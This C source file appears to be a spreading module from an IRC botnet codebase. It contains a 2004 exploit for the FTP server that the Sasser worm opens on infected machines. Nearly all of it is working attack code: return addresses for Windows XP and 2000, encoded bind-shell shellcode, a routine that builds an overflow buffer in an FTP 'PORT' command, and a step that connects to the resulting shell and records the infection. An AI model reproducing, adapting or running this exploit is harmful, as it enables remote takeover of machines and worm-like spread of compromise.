#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_SASSER
/*
  _________ / ___// ____/ ____/
 / ___/ __ \\__ \/ __/ / /
/ /  / /_/ /__/ / /___/ /___
/_/   \____/____/_____/\____/

- ROMANIAN SECURITY RESEARCH 2004 -


sasser v[a-e] exploit (of its ftpd server)

exploit version 1.4, public

author:  mandragore
date:  Mon May 10 16:13:31     2004
vuln type: SEH ptr overwriting
greets:  rosecurity team
discovery: edcba
note:  sasser.e has its ftpd on port 1023
update:  offsets

*/

struct { unsigned long goreg; unsigned long gpa; unsigned long lla; } tsasser[] = {
	{ 0x77BEEB23, 0x77be10CC, 0x77be10D0 }, //unknown
	{ 0x77C1C0BD, 0x77C110CC, 0x77c110D0 }, //wXP SP0+SP1 most others
	{ 0x7801D081, 0x780320cc, 0x780320d0 }, //w2k SP4 only
};

unsigned char bs[]={
	0xEB,0x0F,0x8B,0x34,0x24,0x33,0xC9,0x80,0xC1,0xDD,0x80,0x36,0xDE,0x46,0xE2,0xFA,
	0xC3,0xE8,0xEC,0xFF,0xFF,0xFF,0xBA,0xB9,0x51,0xD8,0xDE,0xDE,0x60,0xDE,0xFE,0x9E,
	0xDE,0xB6,0xED,0xEC,0xDE,0xDE,0xB6,0xA9,0xAD,0xEC,0x81,0x8A,0x21,0xCB,0xDA,0xFE,
	0x9E,0xDE,0x49,0x47,0x8C,0x8C,0x8C,0x8C,0x9C,0x8C,0x9C,0x8C,0x36,0xD5,0xDE,0xDE,
	0xDE,0x89,0x8D,0x9F,0x8D,0xB1,0xBD,0xB5,0xBB,0xAA,0x9F,0xDE,0x89,0x21,0xC8,0x21,
	0x0E,0x4D,0xB4,0xDE,0xB6,0xDC,0xDE,0xCA,0x6A,0x55,0x1A,0xB4,0xCE,0x8E,0x8D,0x36,
	0xDB,0xDE,0xDE,0xDE,0xBC,0xB7,0xB0,0xBA,0xDE,0x89,0x21,0xC8,0x21,0x0E,0xB4,0xDF,
	0x8D,0x36,0xD9,0xDE,0xDE,0xDE,0xB2,0xB7,0xAD,0xAA,0xBB,0xB0,0xDE,0x89,0x21,0xC8,
	0x21,0x0E,0xB4,0xDE,0x8A,0x8D,0x36,0xD9,0xDE,0xDE,0xDE,0xBF,0xBD,0xBD,0xBB,0xAE,
	0xAA,0xDE,0x89,0x21,0xC8,0x21,0x0E,0x55,0x06,0xED,0x1E,0xB4,0xCE,0x87,0x55,0x22,
	0x89,0xDD,0x27,0x89,0x2D,0x75,0x55,0xE2,0xFA,0x8E,0x8E,0x8E,0xB4,0xDF,0x8E,0x8E,
	0x36,0xDA,0xDE,0xDE,0xDE,0xBD,0xB3,0xBA,0xDE,0x8E,0x36,0xD1,0xDE,0xDE,0xDE,0x9D,
	0xAC,0xBB,0xBF,0xAA,0xBB,0x8E,0xAC,0xB1,0xBD,0xBB,0xAD,0xAD,0x9F,0xDE,0x18,0xD9,
	0x9A,0x19,0x99,0xF2,0xDF,0xDF,0xDE,0xDE,0x5D,0x19,0xE6,0x4D,0x75,0x75,0x75,0xBA,
	0xB9,0x7F,0xEE,0xDE,0x55,0x9E,0xD2,0x55,0x9E,0xC2,0x55,0xDE,0x21,0xAE,0xD6,0x21,
	0xC8,0x21,0x0E
};

bool sasser(EXINFO exinfo)
{
	char *jmp[]={"\xeb\x06","\xe9\x13\xfc\xff\xff"};
	int tType=2, targetOS, Port=brandom(1024,65534);

	if ((targetOS=FpHost(exinfo.ip, FP_LSASS)) == OS_WINXP) tType = 1;
	Port^=0xdede;
	Port=(Port & 0xff) << 8 | Port >>8;
	memcpy(bs+0x57,&Port,2); 
	Port^=0xdede;
	Port=(Port & 0xff) << 8 | Port >>8;
	// --------------------  core

	SOCKET ssock;
	if((ssock = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) return false;

	SOCKADDR_IN ssin;
	ssin.sin_family = AF_INET;
	ssin.sin_addr.s_addr = finet_addr(exinfo.ip);
	ssin.sin_port = fhtons((unsigned short)exinfo.port);

	if(fconnect(ssock, (LPSOCKADDR)&ssin, sizeof(ssin)) == SOCKET_ERROR) return false;

	char *buff=(char*)calloc(4096,sizeof(char));

	fsend(ssock,"USER x\n",8,0);
	fsend(ssock,"PASS x\n",8,0);
	frecv(ssock,buff,4095,0);

	Sleep(10);
	
	memset(buff+0000,0x90,2000);
	strncpy(buff,"PORT ",5);
	strcat(buff,"\x0a");
	memcpy(buff+272,jmp[0],2);
	memcpy(buff+276,&tsasser[tType].goreg,4);
	memcpy(buff+280,jmp[1],5);
	
	int gpa=tsasser[tType].gpa^0xdededede, lla=tsasser[tType].lla^0xdededede;
	memcpy(bs+0x1d,&gpa,4);
	memcpy(bs+0x2e,&lla,4);
	
	memcpy(buff+300, &bs, sizeof(bs));

	fsend(ssock,buff,strlen(buff),0);
	
	fclosesocket(ssock);

	// Connect to Shell
	ConnectShell(exinfo, Port);
	
	// --------------------  end of core
	
	return (AddEx(exinfo,true));
}
#endif